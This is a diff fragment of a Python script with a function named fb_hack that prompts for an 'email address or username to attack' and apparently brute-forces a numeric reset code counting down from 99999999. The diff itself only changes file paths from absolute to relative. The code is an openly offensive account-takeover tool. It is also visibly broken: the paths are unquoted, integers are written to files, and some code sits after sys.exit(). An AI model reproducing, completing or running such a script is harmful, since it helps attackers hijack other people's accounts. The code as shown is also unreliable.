@@ -153,7 +153,7 @@ def fb_hack(email, codex):
       success = (y, "succeded")
       s = " "
       reset = reset - 1
-      with open(home/krarktel/passcoder.txt, "a") as z:
+      with open(passcoder.txt, "a") as z:
         z.write(reset)
         z.close()
       response1 = browser.response()
@@ -184,7 +184,7 @@ def fb_hack(email, codex):
       s = " "
       reset1 = reset - 1
       reset = reset1
-      with open(home/krarktel/passcoder.txt, "a") as z:
+      with open(passcoder.txt, "a") as z:
         z.write(reset)
         z.close()
       response1 = browser.response()
@@ -217,8 +217,8 @@ def fb_hack(email, codex):
 os.system('clear')
 ehack = input('Email address or username to attack:')
 reset = int(input('Code: ') or 99999999)
-f = open(home/krarktel/Nub/emails.txt, "a")
-z = open(home/krarktel/Nub/passcoder.txt, "a")
+f = open(emails.txt, "a")
+z = open(passcoder.txt, "a")
 f.write(ehack)
 f.close()
 z.write(reset)
@@ -234,9 +234,9 @@ while True:
       reset = reset1
   except:
     sys.exit()
-    with open(home/krarktel/emails.txt, "r") as f:
+    with open(emails.txt, "r") as f:
       ehack = f.readlines(-1)
       f.close()
-    with open(home/krarktel/passcoder.txt, "r") as f:
+    with open(passcoder.txt, "r") as f:
       reset = z.readlines(-1)
     
